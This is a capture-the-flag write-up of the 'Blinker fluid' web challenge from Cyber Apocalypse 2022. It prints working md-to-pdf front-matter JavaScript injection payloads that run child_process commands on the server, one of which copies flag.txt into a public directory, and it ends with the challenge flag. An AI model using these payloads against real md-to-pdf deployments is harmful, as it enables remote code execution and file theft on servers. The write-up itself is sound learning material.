---
layout: load_md
title: The White Circle | Cyber Apocalypse 2022 | Blinker fluid Writeup
desc: Check out our writeup for Blinker fluid for Cyber Apocalypse 2022 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2022
parent: cyber_apocalypse_2022
category: web
challenge: Blinker fluid
tags: "web, bobby, legend, starry, twh, node, cve"
date: 2022-05-21T00:00:00+00:00
last_modified_at: 2022-05-21T00:00:00+00:00
---


> Solved By : Bobbysox, Legend, Starrylord, thewhiteh4t

In blinker fluid challenge our markdown input gets converted into a PDF file available for download.

in the site source we checked `package.json` file :

```json
{
        "name": "blinker-fluids",
        "version": "1.0.0",
        "description": "",
        "main": "index.js",
        "scripts": {
                "start": "node index.js"
        },
        "keywords": [],
        "author": "rayhan0x01",
        "license": "ISC",
        "dependencies": {
                "express": "^4.17.3",
                "md-to-pdf": "^4.1.0",
                "nunjucks": "3.2.3",
                "sqlite-async": "1.1.3",
                "uuid": "8.3.2"
        },
        "devDependencies": {
                "nodemon": "^1.19.1"
        }
}
```

interesting things in this file are : 

```
"md-to-pdf": "^4.1.0"
"nunjucks": "3.2.3"
```

we quickly found the following CVE for `md-to-pdf` : 

https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880

payload as shown in the link : 

```
---js\n((require("child_process")).execSync("id > /tmp/RCE.txt"))\n---RCE
```

the payload did not work for us as it is so we looked for more info on the same and found this : 

https://github.com/11ty/eleventy/issues/1208


[11ty/eleventy#1208](https://github.com/11ty/eleventy/issues/1208)

so basically nunjucks was having issues with single line payload so we settled on the following : 

```
---js
((require("child_process")).execSync("cat ../flag.txt > static/invoices/rce.txt"))
---
```

line 1 and 3 needed to be exactly as above for it to work and we redirected flag to a file in invoices directory…

```
HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}
```